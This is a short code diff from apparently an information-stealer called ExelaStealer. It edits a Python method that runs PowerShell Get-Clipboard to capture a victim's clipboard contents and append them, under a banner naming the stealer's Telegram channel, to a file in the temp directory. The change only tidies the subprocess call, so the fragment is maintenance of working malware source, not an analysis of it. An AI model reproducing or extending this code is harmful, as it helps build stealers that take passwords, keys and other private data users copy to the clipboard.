@@ -686,8 +686,8 @@ class QuicaxdExela:
     def get_last_clipboard_text(self, path):
         try:
             pathsxd = os.getenv('temp') + "\\" + path
-            process = subprocess.run("powershell.exe Get-Clipboard", capture_output= True,shell= False)
-            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            process = subprocess.run(["powershell.exe", "Get-Clipboard"], capture_output=True, text=True)
+            output = process.stdout.strip()
             if not output == "":
                 with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
                     lst.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
